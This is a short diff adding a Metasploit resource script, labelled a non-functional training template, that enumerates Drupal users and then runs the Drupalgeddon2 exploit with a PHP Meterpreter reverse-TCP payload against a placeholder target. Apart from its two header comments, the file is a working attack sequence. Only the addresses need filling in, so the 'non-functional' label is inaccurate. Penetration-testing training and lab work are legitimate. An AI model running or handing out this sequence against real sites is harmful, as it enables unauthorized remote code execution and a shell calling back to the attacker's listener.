@@ -1,0 +1,17 @@
+# Drupal Scanner Template
+# For Training Use – Non-functional Template
+
+use auxiliary/scanner/http/drupal_views_user_enum
+set RHOSTS <TARGET_IP>
+set RPORT 80
+set TARGETURI /drupal/
+run
+
+use exploit/unix/webapp/drupal_drupalgeddon2
+set PAYLOAD php/meterpreter/reverse_tcp
+set RHOST <TARGET_IP>
+set TARGETURI /drupal/
+set LHOST <LHOST>
+set LPORT <LPORT>
+check
+exploit
